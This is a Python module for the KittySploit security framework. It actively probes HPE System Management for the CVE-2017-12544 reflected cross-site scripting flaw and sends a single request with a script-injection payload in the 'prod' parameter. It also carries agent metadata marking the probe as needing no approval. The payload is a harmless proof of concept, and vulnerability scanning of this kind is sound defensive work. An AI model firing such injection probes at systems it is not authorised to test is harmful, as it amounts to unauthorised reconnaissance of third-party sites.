#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""HPE System Management contains a cross-site scripting vulnerability which allows an attacker to execute arbitr."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'HPE System Management - Cross-Site Scripting Detection',
        'description': 'HPE System Management contains a cross-site scripting vulnerability which allows an attacker to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'xss', 'hp', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://support.hpe.com/hpsc/doc/public/display?docId=emr_na-hpesbmu03753en_us',
            'http://web.archive.org/web/20211206092413/https://securitytracker.com/id/1039437',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-12544',
            'http://www.securitytracker.com/id/1039437',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2017-12544',
    }

    def run(self):
        r = self.http_request(method="GET", path="/gsearch.php.en?prod=';prompt`document.domain`;//", allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ("var prodName = '';prompt`document.domain`;//';",)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="HPE System Management - Cross-Site Scripting detected",
                path="/gsearch.php.en?prod=';prompt`document.domain`;//",
            )
            return True
        return False

